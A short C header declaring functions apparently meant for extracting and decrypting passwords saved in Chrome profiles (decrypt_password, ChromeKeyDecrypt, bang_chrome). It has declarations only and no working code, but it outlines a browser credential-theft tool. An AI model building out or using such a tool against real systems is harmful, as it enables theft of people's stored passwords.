#pragma once



int callback(void*, int, char**, char**);
long get_file_size(char*);
char* decrypt_password(char*);

int ChromeDecryptProfile(char*);
int ChromeKeyDecrypt();
int bang_chrome();